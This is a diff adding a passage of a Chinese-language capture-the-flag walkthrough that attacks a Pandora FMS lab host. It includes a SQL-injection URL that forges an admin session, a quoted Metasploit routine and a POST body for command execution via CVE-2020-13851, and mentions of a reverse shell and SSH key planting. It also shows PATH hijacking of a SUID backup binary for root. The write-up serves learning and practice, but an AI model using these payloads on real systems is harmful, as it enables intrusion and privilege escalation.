@@ -167,3 +167,87 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 
 这个FMS有个sql注入的漏洞[https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained](https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained)
 
+`http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=' union SELECT 1,2,'id_usuario|s:5:"admin";' as data--+`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201282337412.png)
+
+以管理员身份登录后,利用[CVE-2020-13851](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13851)进行命令执行
+
+看[msf的exp](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/pandora_fms_events_exec.rb)
+
+```python
+  def execute_command(cmd, _opts = {})
+    print_status('Executing payload...')
+
+    send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'ajax.php'),
+      'cookie' => @cookie,
+      'ctype' => 'application/x-www-form-urlencoded; charset=UTF-8',
+      'Referer' => full_uri('index.php'),
+      'vars_get' => {
+        'sec' => 'eventos',
+        'sec2' => 'operation/events/events'
+      },
+      'vars_post' => {
+        'page' => 'include/ajax/events',
+        'perform_event_response' => '10000000',
+        'target' => cmd.to_s,
+        'response_id' => '1'
+      }
+    }, 0) # the server will not send a response, so the module shouldn't wait for one
+  end
+```
+
+`http://127.0.0.1/pandora_console/ajax.php`
+
+post传参`page=include/ajax/events&perform_event_response=10000000&target=ls&response_id=1`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201282346505.png)
+
+成功执行命令
+
+当前用户为`matt`,`uid=1000(matt) gid=1000(matt) groups=1000(matt)`
+
+把shell反弹回本地
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291111365.png)
+
+在`~/.ssh`下面加个`authorized_keys`以便ssh连接
+
+注意到在`find / -user root -perm -4000 -print 2>/dev/null`中有个`/usr/bin/pandora_backup`
+
+```cpp
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  __uid_t v3; // ebx
+  __uid_t v4; // eax
+  int result; // eax
+
+  v3 = getuid();
+  v4 = geteuid();
+  setreuid(v4, v3);
+  puts("PandoraFMS Backup Utility");
+  puts("Now attempting to backup PandoraFMS client");
+  if ( system("tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*") )
+  {
+    puts("Backup failed!\nCheck your permissions!");
+    result = 1;
+  }
+  else
+  {
+    puts("Backup successful!");
+    puts("Terminating program!");
+    result = 0;
+  }
+  return result;
+}
+```
+
+`tar`是相对路径下的,把环境变量中的`PATH`修改到`/tmp`目录并且在`/tmp`下新建个`tar`的`/bin/bash`就ok了
+
+`export PATH=/tmp:$PATH`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291132298.png)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291133153.png)
